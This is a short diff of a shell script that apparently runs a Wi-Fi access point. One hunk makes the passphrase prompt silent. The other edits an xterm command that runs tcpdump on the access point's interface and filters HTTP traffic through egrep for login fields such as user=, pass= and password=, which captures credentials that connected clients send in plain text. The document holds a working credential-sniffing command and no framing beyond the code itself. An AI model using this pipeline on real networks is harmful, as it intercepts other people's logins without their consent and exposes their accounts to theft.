@@ -11,7 +11,7 @@ read wifitype
 if [ $wifitype = 2 ]
 then
 	echo "Please enter the passphrase"
-	read passphrase	
+	read -s passphrase	
 	
 fi
 echo "Setting up interfaces, this might take while"
@@ -91,7 +91,7 @@ then
 	done
 fi
 
-xterm -hold -e "tcpdump -i wlan0 port http -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20" &
+xterm -hold -e "tcpdump -i ${interface_ap} port http -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20" &
 
 
 
